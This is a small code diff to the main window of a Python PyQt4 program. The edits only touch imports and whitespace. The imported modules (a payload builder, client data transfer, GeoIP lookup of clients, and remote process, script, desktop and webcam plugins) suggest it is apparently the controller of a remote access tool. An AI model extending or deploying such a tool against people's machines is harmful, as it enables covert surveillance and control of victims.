@@ -4,8 +4,6 @@ import sys
 import socket
 import os
 import time
-import ast
-import zlib
 import threading
 import hashlib
 import string
@@ -17,7 +15,7 @@ from PyQt4.QtCore import *
 from libs import pygeoip
 from libs.language import Translate
 from ui import gui
-from libs.log_viewer import LogViewer
+from LogViewer import LogViewer
 from libs.settings import Config, Settings
 from libs.builder import Builder
 from libs.data_transfer import data_receive, data_send, data_get
@@ -27,6 +25,7 @@ from plugins.mprocesses import main as mprocesses
 from plugins.mscript import main as mscript
 from plugins.mdesktop import main as mdesktop
 from plugins.mwebcam import main as mwebcam
+
 
 # initial geo ip database
 geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
@@ -605,7 +604,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 except SyntaxError:
                     self.disconnect_from_server()
                     self.acceptthreadState = False
-
 
     def view_logs(self):
         client = self.current_client()
